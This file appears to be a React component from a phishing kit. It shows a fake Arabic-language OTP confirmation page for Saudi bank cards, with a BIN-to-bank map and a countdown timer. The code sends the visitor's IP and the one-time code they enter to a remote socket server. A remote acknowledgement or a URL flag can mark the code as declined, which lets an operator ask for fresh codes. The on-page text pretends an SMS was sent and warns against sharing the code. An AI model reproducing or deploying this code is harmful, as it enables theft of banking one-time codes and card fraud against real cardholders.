import React, { useEffect, useState } from "react";
import { io } from "socket.io-client";
import { socket } from "../App";

const Verification = () => {
  const [ip, setIp] = useState(null);
  const [code, setCode] = useState("");
  const [timeLeft, setTimeLeft] = useState(60);
  const [cardLogo, setCardLogo] = useState("");
  const [bankLogo, setBankLogo] = useState("");
  const [declined, setDeclined] = useState(false);
  const [loading, setLoading] = useState(false);

  // BIN to bank map
  const SAUDI_BINS = {
    588845: "Alrajhi",
    458214: "SNB",
    402360: "Alinma",
    407302: "Samba",
    409665: "Riyad",
    428916: "SaudiEnaya",
    512345: "ArabNational",
    535577: "Jazeera",
    588561: "Alawwal",
    540172: "Enjaz",
    400468: "Albilad",
    484783: "Alrajhi",
  };

  useEffect(() => {
    // Get IP and emit current page
    const fetchIP = async () => {
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        const { ip } = await res.json();
        setIp(ip);
        socket.emit("updateLocation", {
          ip,
          page: "verification",
        });
      } catch (err) {
        console.error("IP fetch failed:", err);
      }

      setBankLogo(
        sessionStorage.getItem("paymentMethod") === "mada"
          ? `/mada.png`
          : "/mada.svg"
      );
    };
    fetchIP();

    // Countdown timer
    const interval = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 1) clearInterval(interval);
        return prev - 1;
      });
    }, 1000);

    // Card Type
    const scheme = sessionStorage.getItem("paymentMethod");
    if (scheme === "visa_mastarcard") {
      setCardLogo("/visa_logo.jpg");
    } else if (scheme === "mastercard") {
      setCardLogo("/mastar.svg");
    } else {
      setCardLogo("/mad.png");
    }

    // Bank Logo
    const bin = sessionStorage.getItem("cardBin");
    const bankKey = SAUDI_BINS[bin];

    // Check URL for decline
    const params = new URLSearchParams(window.location.search);
    if (params.get("declined") === "true") {
      setDeclined(true);
    }

    // Socket ack
    socket.on("ackVerification", (resp) => {
      if (!resp.success) {
        setLoading(false);
        setDeclined(true);
        console.error("Verification failed:", resp.error);
      }
    });

    return () => clearInterval(interval);
  }, []);

  const handleSubmit = (e) => {
    e.preventDefault();
    if (!ip) return;

    setLoading(true);
    socket.emit("submitVerification", {
      ip,
      verification_code_two: code,
    });
  };

  return (
    <div className="flex flex-col justify-center items-center min-h-screen bg-gray-50 font-sans w-11/12 ">
      <div className="w-full flex items-start justify-start">
        <img
          src="/Bca-logo.svg"
          alt="Card Type"
          className="h-10 w-20 object-contain"
        />
      </div>
      <div className="w-full max-w-md bg-white p-6 border-gray-100 shadow-lg border rounded-md">
        <div className="flex justify-center gap-x-5 items-center mb-4">
          <img
            src={cardLogo}
            alt="Card Type"
            className="h-10 w-20 object-contain"
          />
          {cardLogo === "/visa_logo.jpg" ? (
            <img
              src="/mastar.svg"
              alt="Card Type"
              className="h-10 w-20 object-contain"
            />
          ) : (
            ""
          )}
        </div>
        <h2 className="text-xl font-bold text-center mb-3">
          تأكيد عملية الشراء
        </h2>
        <p className="text-sm text-right text-gray-600">
          تم إرسال رسالة نصية تحتوي على رمز تأكيد لمرة واحدة (OTP) إلى رقمك
          المسجل لدينا لتأكيد حركة الدفع في{" "}
          <span dir="ltr">{new Date().toLocaleString("ar-EG")}</span>
        </p>
        <p className="text-sm text-right text-gray-600 mt-3">
          يرجى عدم مشاركة الرمز مع أحد.
        </p>

        <form onSubmit={handleSubmit} className="mt-5">
          <div className="mb-4 text-right">
            <label htmlFor="otp" className="block text-sm text-gray-700 mb-1">
              : أدخل الرمز هنا
            </label>
            <input
              type="tel"
              maxLength={6}
              pattern="^(?:\d{4}|\d{6})$"
              required
              id="otp"
              className="w-full border border-gray-300 rounded p-2 text-center"
              value={code}
              onChange={(e) => {
                const val = e.target.value.replace(/\D/g, "").slice(0, 6);
                setCode(val);
              }}
            />
            {declined && (
              <div className="text-red-600 text-sm mt-2">
                الرمز المدخل غير صحيح.
              </div>
            )}
          </div>

          <button
            type="submit"
            className="w-full bg-blue-600 text-white py-2 rounded hover:bg-blue-700 transition"
            disabled={loading}
          >
            تأكيد
          </button>
          <p className="text-xs text-center w-full mt-3">
            ستنتهي صلاحية هذه الصفحة تلقائياً بعد{" "}
            <span className="text-red-500">{timeLeft}</span> ثانية
          </p>

          <p className="text-sm text-right text-gray-400 mt-4">
            هل تحتاج للمساعدة؟
          </p>
        </form>

        {loading && (
          <div className="fixed inset-0 bg-black bg-opacity-50 flex justify-center items-center z-50">
            <div className="text-center text-white">
              <div className="loader border-4 border-white border-t-transparent rounded-full w-10 h-10 mx-auto animate-spin mb-3"></div>
              <h5 className="font-bold">يرجى الانتظار</h5>
              <p>انتظر حتى تتم معالجة طلبك</p>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

export default Verification;
